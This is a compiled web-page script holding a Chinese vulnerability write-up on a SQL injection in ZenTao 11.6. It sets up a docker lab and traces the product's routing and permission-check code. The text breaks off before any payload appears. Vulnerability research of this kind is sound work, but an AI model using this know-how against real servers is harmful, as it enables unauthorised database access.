import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as e,o,c as l,a as n,b as s,d as c,e as a}from"./app-58e4a7d6.js";const i={},r=a(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>禅道 11.6 版本中对用户接口调用权限过滤不完善，导致调用接口执行SQL语句导致SQL注入</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>禅道 11.6
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="环境搭建" tabindex="-1"><a class="header-anchor" href="#环境搭建" aria-hidden="true">#</a> 环境搭建</h2><p>这里使用docker环境搭建</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>docker run --name zentao_v11.6 -p 8084:80 -v /u01/zentao/www:/app/zentaopms -v /u01/zentao/data:/var/lib/mysql -e MYSQL_ROOT_PASSWORD=123456 -d docker.io/yunwisdom/zentao:v11.6
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div>`,7),u={href:"http://xxx.xxx.xxx.xxx:8084",target:"_blank",rel:"noopener noreferrer"},k=n("strong",null,"http://xxx.xxx.xxx.xxx:8084",-1),d=a(`<figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202092027601.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>先对禅道的调用流程进行分析,先查看目录为<strong>www/index.php</strong>首页文件中</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202092028823.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>这里使用<strong>router::createApp</strong>创建了一个APP对象</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token variable">$app</span> <span class="token operator">=</span> <span class="token class-name static-context">router</span><span class="token operator">::</span><span class="token function">createApp</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;pms&#39;</span><span class="token punctuation">,</span> <span class="token function">dirname</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;router&#39;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>来到<strong>framework/base/router.class.php</strong>文件查看到<strong>createApp</strong>方法</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202092028491.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code> <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">createApp</span><span class="token punctuation">(</span><span class="token variable">$appName</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;demo&#39;</span><span class="token punctuation">,</span> <span class="token variable">$appRoot</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;&#39;</span><span class="token punctuation">,</span> <span class="token variable">$className</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;&#39;</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$className</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$className</span> <span class="token operator">=</span> <span class="token constant">__CLASS__</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token keyword">new</span> <span class="token variable">$className</span><span class="token punctuation">(</span><span class="token variable">$appName</span><span class="token punctuation">,</span> <span class="token variable">$appRoot</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这里New了一个对象，查看一下调用方法(348行)</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202202092029270.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>在358行处调用了<strong>setConfigRoot</strong>方法</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">setConfigRoot</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">setConfigRoot</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">configRoot</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">basePath</span> <span class="token operator">.</span> <span class="token string single-quoted-string">&#39;config&#39;</span> <span class="token operator">.</span> <span class="token constant">DS</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>在363行处调用了<strong>loadMainConfig</strong>方法</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">loadMainConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">loadMainConfig</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token comment">/* 初始化$config对象。Init the $config object. */</span>
        <span class="token keyword">global</span> <span class="token variable">$config</span><span class="token punctuation">,</span> <span class="token variable">$filter</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_object</span><span class="token punctuation">(</span><span class="token variable">$config</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$config</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">config</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">config</span> <span class="token operator">=</span> <span class="token variable">$config</span><span class="token punctuation">;</span>

        <span class="token comment">/* 加载主配置文件。 Load the main config file. */</span>
        <span class="token variable">$mainConfigFile</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">configRoot</span> <span class="token operator">.</span> <span class="token string single-quoted-string">&#39;config.php&#39;</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$mainConfigFile</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">triggerError</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;The main config file <span class="token interpolation"><span class="token variable">$mainConfigFile</span></span> not found&quot;</span><span class="token punctuation">,</span> <span class="token constant">__FILE__</span><span class="token punctuation">,</span> <span class="token constant">__LINE__</span><span class="token punctuation">,</span> <span class="token variable">$exit</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">include</span> <span class="token variable">$mainConfigFile</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这里包含了配置文件<strong>config.php</strong>配置文件，文件目录为**/config/config.php**</p><p>在25行定义了调用方法</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token variable">$config</span><span class="token operator">-&gt;</span><span class="token property">requestType</span> <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;PATH_INFO&#39;</span><span class="token punctuation">;</span>         <span class="token comment">// 请求类型：PATH_INFO|PATHINFO2|GET。    The request type: PATH_INFO|PATH_INFO2|GET.</span>
<span class="token variable">$config</span><span class="token operator">-&gt;</span><span class="token property">requestFix</span>  <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;-&#39;</span><span class="token punctuation">;</span>                 <span class="token comment">// PATH_INFO和PATH_INFO2模式的分隔符。    The divider in the url when PATH_INFO|PATH_INFO2.</span>
<span class="token variable">$config</span><span class="token operator">-&gt;</span><span class="token property">moduleVar</span>   <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;m&#39;</span><span class="token punctuation">;</span>                 <span class="token comment">// 请求类型为GET：模块变量名。            requestType=GET: the module var name.</span>
<span class="token variable">$config</span><span class="token operator">-&gt;</span><span class="token property">methodVar</span>   <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;f&#39;</span><span class="token punctuation">;</span>                 <span class="token comment">// 请求类型为GET：模块变量名。            requestType=GET: the method var name.</span>
<span class="token variable">$config</span><span class="token operator">-&gt;</span><span class="token property">viewVar</span>     <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;t&#39;</span><span class="token punctuation">;</span>                 <span class="token comment">// 请求类型为GET：视图变量名。            requestType=GET: the view var name.</span>
<span class="token variable">$config</span><span class="token operator">-&gt;</span><span class="token property">sessionVar</span>  <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;zentaosid&#39;</span><span class="token punctuation">;</span>         <span class="token comment">// 请求类型为GET：session变量名。         requestType=GET: the session var name.</span>
<span class="token variable">$config</span><span class="token operator">-&gt;</span><span class="token property">views</span>       <span class="token operator">=</span> <span class="token string single-quoted-string">&#39;,html,json,mhtml,xhtml,&#39;</span><span class="token punctuation">;</span> <span class="token comment">// 支持的视图类型。                       Supported view formats.</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可以发现这里存在两种路由<strong>PATH_INFO|PATH_INFO2</strong>：一种是m、f、t来进行调用。另外一种是通过-来进行调用</p><p>在<strong>index.php</strong>中的<strong>66行</strong></p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token variable">$app</span><span class="token operator">-&gt;</span><span class="token function">parseRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">parseRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">config</span><span class="token operator">-&gt;</span><span class="token property">requestType</span> <span class="token operator">==</span> <span class="token string single-quoted-string">&#39;PATH_INFO&#39;</span> <span class="token keyword">or</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">config</span><span class="token operator">-&gt;</span><span class="token property">requestType</span> <span class="token operator">==</span> <span class="token string single-quoted-string">&#39;PATH_INFO2&#39;</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parsePathInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">setRouteByPathInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">elseif</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">config</span><span class="token operator">-&gt;</span><span class="token property">requestType</span> <span class="token operator">==</span> <span class="token string single-quoted-string">&#39;GET&#39;</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">parseGET</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">setRouteByGET</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">triggerError</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;The request type <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">config</span><span class="token operator">-&gt;</span><span class="token property">requestType</span><span class="token punctuation">}</span></span> not supported&quot;</span><span class="token punctuation">,</span> <span class="token constant">__FILE__</span><span class="token punctuation">,</span> <span class="token constant">__LINE__</span><span class="token punctuation">,</span> <span class="token variable">$exit</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>看到这一条则是判断力两种调用方法</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">config</span><span class="token operator">-&gt;</span><span class="token property">requestType</span> <span class="token operator">==</span> <span class="token string single-quoted-string">&#39;PATH_INFO&#39;</span> <span class="token keyword">or</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">config</span><span class="token operator">-&gt;</span><span class="token property">requestType</span> <span class="token operator">==</span> <span class="token string single-quoted-string">&#39;PATH_INFO2&#39;</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>跟进<strong>setRouteByPathInfo方法</strong></p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">setRouteByPathInfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token constant">URI</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token comment">/*
             * 根据$requestFix分割符，分割网址。
             * There&#39;s the request seperator, split the URI by it.
             **/</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token constant">URI</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">config</span><span class="token operator">-&gt;</span><span class="token property">requestFix</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span>
            <span class="token punctuation">{</span>
                <span class="token variable">$items</span> <span class="token operator">=</span> <span class="token function">explode</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">config</span><span class="token operator">-&gt;</span><span class="token property">requestFix</span><span class="token punctuation">,</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token constant">URI</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">setModuleName</span><span class="token punctuation">(</span><span class="token variable">$items</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">setMethodName</span><span class="token punctuation">(</span><span class="token variable">$items</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>    
            <span class="token comment">/*
             * 如果网址中没有分隔符，使用默认的方法。
             * No reqeust seperator, use the default method name.
             **/</span>
            <span class="token keyword">else</span>
            <span class="token punctuation">{</span>
                <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">setModuleName</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token constant">URI</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">setMethodName</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">config</span><span class="token operator">-&gt;</span><span class="token property">default</span><span class="token operator">-&gt;</span><span class="token property">method</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">}</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span>
        <span class="token punctuation">{</span>    
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">setModuleName</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">config</span><span class="token operator">-&gt;</span><span class="token property">default</span><span class="token operator">-&gt;</span><span class="token property">module</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 使用默认模块 use the default module.</span>
            <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">setMethodName</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">config</span><span class="token operator">-&gt;</span><span class="token property">default</span><span class="token operator">-&gt;</span><span class="token property">method</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token comment">// 使用默认方法 use the default method.</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">setControlFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>所以可以推断出调用的方法</p><p>例如<strong>登录页面</strong>有两种访问方法</p><div class="language-plain line-numbers-mode" data-ext="plain"><pre class="language-plain"><code>http://xxx.xxx.xxx.xxx/index.php?m=user&amp;f=login
http://xxx.xxx.xxx.xxx/user-login.html
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>再看一下<strong>checkPriv方法</strong></p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">checkPriv</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$module</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">app</span><span class="token operator">-&gt;</span><span class="token function">getModuleName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$method</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">app</span><span class="token operator">-&gt;</span><span class="token function">getMethodName</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">app</span><span class="token operator">-&gt;</span><span class="token property">user</span><span class="token operator">-&gt;</span><span class="token property">modifyPassword</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$module</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">&#39;my&#39;</span> <span class="token keyword">or</span> <span class="token variable">$method</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">&#39;changepassword&#39;</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token punctuation">(</span><span class="token variable">$module</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">&#39;user&#39;</span> <span class="token keyword">or</span> <span class="token variable">$method</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">&#39;logout&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token class-name static-context">js</span><span class="token operator">::</span><span class="token function">locate</span><span class="token punctuation">(</span><span class="token class-name static-context">helper</span><span class="token operator">::</span><span class="token function">createLink</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;my&#39;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;changepassword&#39;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">isOpenMethod</span><span class="token punctuation">(</span><span class="token variable">$module</span><span class="token punctuation">,</span> <span class="token variable">$method</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">loadModel</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;user&#39;</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">isLogon</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">server</span><span class="token operator">-&gt;</span><span class="token property">php_auth_user</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">user</span><span class="token operator">-&gt;</span><span class="token function">identifyByPhpAuth</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">loadModel</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;user&#39;</span><span class="token punctuation">)</span><span class="token operator">-&gt;</span><span class="token function">isLogon</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">cookie</span><span class="token operator">-&gt;</span><span class="token property">za</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">user</span><span class="token operator">-&gt;</span><span class="token function">identifyByCookie</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">app</span><span class="token operator">-&gt;</span><span class="token property">user</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">{</span>
            <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token class-name static-context">commonModel</span><span class="token operator">::</span><span class="token function">hasPriv</span><span class="token punctuation">(</span><span class="token variable">$module</span><span class="token punctuation">,</span> <span class="token variable">$method</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">deny</span><span class="token punctuation">(</span><span class="token variable">$module</span><span class="token punctuation">,</span> <span class="token variable">$method</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">else</span>
        <span class="token punctuation">{</span>
            <span class="token variable">$referer</span>  <span class="token operator">=</span> <span class="token class-name static-context">helper</span><span class="token operator">::</span><span class="token function">safe64Encode</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">app</span><span class="token operator">-&gt;</span><span class="token function">getURI</span><span class="token punctuation">(</span><span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token class-name static-context">js</span><span class="token operator">::</span><span class="token function">locate</span><span class="token punctuation">(</span><span class="token class-name static-context">helper</span><span class="token operator">::</span><span class="token function">createLink</span><span class="token punctuation">(</span><span class="token string single-quoted-string">&#39;user&#39;</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">&#39;login&#39;</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">&quot;referer=<span class="token interpolation"><span class="token variable">$referer</span></span>&quot;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>这里检测了调用模块和方法的权限，可以知道除了<strong>isOpenMethod</strong>中定义的公开模块和方法之外，其他的方法都是需要登录的</p><p>最后是**$app-&gt;loadModule();**这段代码</p><div class="language-php line-numbers-mode" data-ext="php"><pre class="language-php"><code><span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">loadModule</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token punctuation">{</span>
        <span class="token variable">$appName</span>    <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">appName</span><span class="token punctuation">;</span>
        <span class="token variable">$moduleName</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">moduleName</span><span class="token punctuation">;</span>
        <span class="token variable">$methodName</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">methodName</span><span class="token punctuation">;</span>

        <span class="token comment">/* 
         * 引入该模块的control文件。
         * Include the control file of the module.
         **/</span>
        <span class="token variable">$file2Included</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">setActionExtFile</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">extActionFile</span> <span class="token punctuation">:</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token property">controlFile</span><span class="token punctuation">;</span>
        <span class="token function">chdir</span><span class="token punctuation">(</span><span class="token function">dirname</span><span class="token punctuation">(</span><span class="token variable">$file2Included</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token class-name static-context">helper</span><span class="token operator">::</span><span class="token function">import</span><span class="token punctuation">(</span><span class="token variable">$file2Included</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">/*
         * 设置control的类名。
         * Set the class name of the control.
         **/</span>
        <span class="token variable">$className</span> <span class="token operator">=</span> <span class="token function">class_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;my<span class="token interpolation"><span class="token variable">$moduleName</span></span>&quot;</span><span class="token punctuation">)</span> <span class="token operator">?</span> <span class="token string double-quoted-string">&quot;my<span class="token interpolation"><span class="token variable">$moduleName</span></span>&quot;</span> <span class="token punctuation">:</span> <span class="token variable">$moduleName</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">class_exists</span><span class="token punctuation">(</span><span class="token variable">$className</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token variable">$this</span><span class="token operator">-&gt;</span><span class="token function">triggerError</span><span class="token punctuation">(</span><span class="token string double-quoted-string">&quot;the control <span class="token interpolation"><span class="token variable">$className</span></span> not found&quot;</span><span class="token punctuation">,</span> <span class="token constant">__FILE__</span><span class="token punctuation">,</span> <span class="token constant">__LINE__</span><span class="token punctuation">,</span> <span class="token variable">$exit</span> <span class="token operator">=</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token comment">/*
         * 创建control类的实例。
         * Create a instance of the control.
         **/</span>
        <span class="token variable">$module</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token variable">$className</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
